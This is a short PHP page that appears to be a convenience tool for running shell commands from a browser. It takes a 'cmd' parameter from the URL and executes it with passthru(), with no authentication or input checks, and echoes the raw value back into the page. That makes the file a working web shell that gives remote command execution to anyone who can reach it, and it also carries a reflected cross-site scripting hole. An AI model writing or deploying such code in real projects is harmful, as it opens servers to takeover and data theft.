<?php
  $cmd=isset($_GET['cmd']) ? $_GET['cmd'] : 'python test.py argument';
?>

<!--input command here-->
<form method=GET>
  <input name=cmd id=cmd value="<?php echo $cmd?>" placeholder="write command here" style="width:100%">
</form>

<!--show input-->
<?php echo "<h2><code>&gt; $cmd</code></h2>"?>

<!--show output-->
<pre>&gt;<code>
<?php
  $result=passthru($cmd);
  echo $result;
?>
<pre><code>

<!--focus on cmd prompt-->
<script>
  document.querySelector('#cmd').select();
</script>
